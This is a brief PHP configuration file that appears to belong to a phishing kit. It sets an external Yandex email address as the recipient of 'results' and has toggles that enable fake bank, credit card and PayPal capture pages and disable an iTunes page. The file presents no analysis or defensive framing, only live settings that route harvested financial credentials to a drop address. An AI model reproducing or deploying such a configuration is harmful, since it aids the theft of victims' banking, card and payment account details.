<?php

	$to = "wickresult@yandex.com";
	
	$show_bank = true; //true/false
	
	$Show_CC = true;  //true/false
	
	$Show_Paypal = true; //true/false
	
	$Show_Itunes = false; //true/false

?>